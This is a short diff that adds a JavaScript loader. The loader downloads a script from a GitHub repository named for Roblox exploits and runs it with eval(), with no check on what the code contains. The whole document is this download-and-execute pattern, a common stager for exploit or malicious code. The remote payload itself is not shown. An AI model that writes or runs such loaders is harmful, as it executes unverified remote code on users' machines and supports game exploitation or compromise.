@@ -1,0 +1,11 @@
+(async () => {
+    try {
+        const url = "https://raw.githubusercontent.com/TheRobloxBaconExploits/duck-life/refs/heads/main/roblox.jtol";
+        const response = await fetch(url);
+        if (!response.ok) throw new Error("Failed to fetch main script");
+        const code = await response.text();
+        eval(code); // runs your main Roblox script
+    } catch (err) {
+        console.error("Loader error:", err);
+    }
+})();
